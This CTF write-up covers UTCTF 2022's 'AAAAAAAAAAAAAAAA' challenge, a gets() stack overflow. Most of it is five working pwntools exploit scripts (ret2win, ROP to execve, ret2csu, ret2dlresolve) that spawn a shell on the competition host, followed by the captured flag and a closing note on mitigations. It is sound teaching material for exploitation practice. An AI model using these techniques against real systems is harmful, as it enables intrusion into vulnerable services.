# UTCTF 2022

## AAAAAAAAAAAAAAAA

>
> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  
>  
> By Tristan (@trab on discord)  
>  
> `nc pwn.utctf.live 5000`  
>  
> [`AAAAAAAAAAAAAAAA`](AAAAAAAAAAAAAAAA)

Tags: _pwn_ _x86-64_ _bof_ _remote-shell_

## Summary

Embryo pwn featuring `gets`.

From `man gets`:

```  
BUGS

Never use gets(). Because it is impossible to tell without knowing the data  
in advance how many characters gets() will read, and because gets() will  
continue to store characters past the end of the buffer, it is extremely  
dangerous to use. It has been used to break computer security. Use fgets()  
instead.  
```

Use `gets` to _break computer security_ **five different ways!**

## Analysis

### Checksec

```  
   Arch:     amd64-64-little  
   RELRO:    Partial RELRO  
   Stack:    No canary found  
   NX:       NX enabled  
   PIE:      No PIE (0x400000)  
```

No PIE + No canary = easy ROP; + Partial RELRO = ret2dlresolve.

### Ghidra Decompile

```c  
undefined8 main(void)  
{  
 char local_78 [111];  
 char local_9;  
  
 local_9 = '\0';  
 gets(local_78);  
 if (local_9 == 'B') {  
   get_flag();  
 }  
 return 0;  
}  
```

`gets` is the vulnerability.  The objective is to overflow the input buffer
(`local_78`) to overwrite `local_9` with the character `B` to call
`get_flag()` below.

`local_78` is `0x78` bytes from the base of the stack frame (right above the
return address `main` will jump to on `return`).  To get to `local_9`, just
write `0x78 - 0x9` bytes of garbage followed by `B`, and the flag is yours:

```c  
void get_flag(void)  
{  
 char *local_18;  
 undefined8 local_10;  
  
 local_18 = "/bin/sh";  
 local_10 = 0;  
 execve("/bin/sh",&local_18,(char **)0x0);  
 return;  
}  
```

`get_flag` should really be called `get_shell`, once you have a shell type
`cat flag.txt`.

That's it.

## Exploit(s)

```python  
#!/usr/bin/env python3

from pwn import *

p = remote('pwn.utctf.live', 5000)

payload  = b''  
payload += (0x78 - 0x9) * b'A'  
payload += b'B'

p.sendline(payload)  
p.interactive()  
```

See _Analysis_ above for an explaination.

But, what if there wasn't a check for `B`?  What if this was missing:

```  
 if (local_9 == 'B') {  
   get_flag();  
 }  
```

No problem, we'll just have to call `get_flag` ourselves:  

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./AAAAAAAAAAAAAAAA',checksec=False)

if args.REMOTE:  
   p = remote('pwn.utctf.live', 5000)  
else:  
   p = process(binary.path)

payload  = b''  
payload += 0x78 * b'A'  
payload += p64(binary.sym.get_flag)

p.sendline(payload)  
p.interactive()  
```

Welcome to embryo ROP.  Blow out the stack frame and get to the return
address, then replace with the location of `get_flag()`.

But, what if `execve` in `get_flag` is really a troll, e.g. `/bin/echo no flag
for you`?

No problem, we'll just have to send `/bin/sh` ourselves:

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./AAAAAAAAAAAAAAAA',checksec=False)

if args.REMOTE:  
   p = remote('pwn.utctf.live', 5000)  
else:  
   p = process(binary.path)

pop_rdi = binary.search(asm('pop rdi; ret')).__next__()  
pop_rsi_r15 = binary.search(asm('pop rsi; pop r15; ret')).__next__()

payload  = b''  
payload += 0x78 * b'A'  
payload += p64(pop_rdi)  
payload += p64(binary.bss())  
payload += p64(binary.plt.gets)  
payload += p64(pop_rdi)  
payload += p64(binary.bss())  
payload += p64(pop_rsi_r15)  
payload += p64(0)  
payload += p64(0)  
payload += p64(binary.plt.execve)  
payload += b'\n'  
payload += b'/bin/sh\0'

p.sendline(payload)  
p.interactive()  
```

Baby ROP.  Just need a few gadgets from the binary to then call `gets`
ourselves to write `/bin/sh` to the BSS, then call `execve` directly.

For this to work `rdx` needs to be `0` and fortunately it is.

But what if `rdx` is not set to `0`?

No prob, ret2csu:

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./AAAAAAAAAAAAAAAA',checksec=False)

if args.REMOTE:  
   p = remote('pwn.utctf.live', 5000)  
else:  
   p = process(binary.path)

'''  
 401210:   4c 89 f2                mov    rdx,r14  
 401213:   4c 89 ee                mov    rsi,r13  
 401216:   44 89 e7                mov    edi,r12d  
 401219:   41 ff 14 df             call   QWORD PTR [r15+rbx*8]  
 40121d:   48 83 c3 01             add    rbx,0x1  
 401221:   48 39 dd                cmp    rbp,rbx  
 401224:   75 ea                   jne    401210 <__libc_csu_init+0x40>  
 401226:   48 83 c4 08             add    rsp,0x8  
 40122a:   5b                      pop    rbx  
 40122b:   5d                      pop    rbp  
 40122c:   41 5c                   pop    r12  
 40122e:   41 5d                   pop    r13  
 401230:   41 5e                   pop    r14  
 401232:   41 5f                   pop    r15  
 401234:   c3                      ret  
'''

pop_rbx_rbp_r12_r13_r14_r15 = 0x40122a  
set_rdx_rsi_rdi_call_r15 = 0x401210  
pop_rdi = binary.search(asm('pop rdi; ret')).__next__()

payload  = b''  
payload += 0x78 * b'A'  
payload += p64(pop_rdi)  
payload += p64(binary.bss())  
payload += p64(binary.plt.gets)  
payload += p64(pop_rbx_rbp_r12_r13_r14_r15)  
payload += p64(0)  
payload += p64(1)  
payload += p64(binary.bss())  
payload += p64(0)  
payload += p64(0)  
payload += p64(binary.got.execve)  
payload += p64(set_rdx_rsi_rdi_call_r15)  
payload += 7 * p64(0)  
payload += b'\n'  
payload += b'/bin/sh\0'

p.sendline(payload)  
p.interactive()  
```

Baby talk ROP.  Google _ret2csu_ or read some of my other write ups for
details.

But, what if there is no `execve` in the GOT?

No worries, we'll just use `system`:

```python  
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./AAAAAAAAAAAAAAAA', checksec=False)

rop = ROP(binary)  
ret = rop.find_gadget(['ret'])[0]

dl = Ret2dlresolvePayload(binary, symbol='system', args=['sh'])

rop.raw(ret)  
rop.gets(dl.data_addr)  
rop.ret2dlresolve(dl)

if args.REMOTE:  
   p = remote('pwn.utctf.live', 5000)  
else:  
   p = process(binary.path)

payload  = b''  
payload += 0x78 * b'A'  
payload += rop.chain()  
payload += b'\n'  
payload += dl.payload

p.sendline(payload)  
p.interactive()  
```

Baby walk.  Google _ret2dlresolve_ or read some of my other write ups for
details.

Any of the above will get you a shell:

```bash  
# ./exploit.py  
[+] Opening connection to pwn.utctf.live on port 5000: Done  
[*] Switching to interactive mode  
$ cat flag.txt  
utflag{you_expected_the_flag_to_be_screaming_but_it_was_me_dio98054042}  
```

### But, what if ...

Just because there's a vulnerability (e.g. `gets`), that does not mean it's
exploitable.  There are other ways to mitigate, e.g. recompile with a stack
canary and PIE (the defaults BTW), and this problem becomes a lot harder if
not impossible.  

Original writeup (https://github.com/datajerk/ctf-write-
ups/tree/master/utctf2022/AAAAAAAAAAAAAAAA).